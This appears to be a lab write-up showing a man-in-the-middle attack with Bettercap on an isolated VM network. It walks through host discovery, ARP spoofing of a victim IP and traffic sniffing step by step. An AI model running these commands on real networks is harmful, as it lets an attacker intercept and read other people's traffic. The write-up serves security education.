# MITM Attack — ARP Spoofing with Bettercap

> ⚠️ **Disclaimer:** This was performed in a controlled lab environment for educational purposes only.

---

## What is a MITM Attack?

A Man-in-the-Middle attack occurs when an attacker secretly intercepts communication between two parties. The victims believe they are communicating directly with each other, while the attacker sits in between, reading or modifying the traffic.

---

## Scenario

**Goal:** Demonstrate how ARP Spoofing can be used to intercept traffic on a local network using Bettercap.

**Environment:**
- Attacker Machine: Kali Linux (VM)
- Victim Machine: Ubuntu (VM)
- Network: Isolated lab network

---

## Tools Used

- `ping` — Verify connectivity and discover the target
- `Bettercap` — ARP Spoofing & traffic sniffing

---

## Steps

### 1. Verify Target is Reachable
```bash
ping 192.168.95.140
```
![Ping screenshot]<img width="806" height="503" alt="Screenshot 2026-04-21 234608" src="https://github.com/user-attachments/assets/61240b36-faaf-4753-b148-e5c666b1b163" />



---

### 2. Launch Bettercap
```bash
sudo bettercap -iface eth0
```
<img width="1112" height="330" alt="image" src="https://github.com/user-attachments/assets/718f0de2-73e6-49f7-9563-41dfcb799ead" />

---

### 3. Discover Hosts on the Network , Set the Target , Enable ARP Spoofing , Sniff Network Traffic
```bash
net.probe on
```
<img width="1847" height="912" alt="Screenshot 2026-04-21 235249" src="https://github.com/user-attachments/assets/e27d1086-bc8f-4b9e-acae-e712e6978b4b" />

```
set arp.spoof.target 192.168.95.140 and arp.spoof on
```
<img width="1373" height="474" alt="Screenshot 2026-04-21 235435" src="https://github.com/user-attachments/assets/d80bc5d9-85d7-4dde-838c-5424059d75b7" />

```
net.sniff on
```
<img width="1821" height="352" alt="image" src="https://github.com/user-attachments/assets/b8f2416f-d813-4536-a320-fecefb5be8ff" />



```
ARP Spoofing
```
<img width="1898" height="843" alt="Screenshot 2026-04-21 232114" src="https://github.com/user-attachments/assets/db50478f-f185-40df-bff7-5cf789e6abfc" />

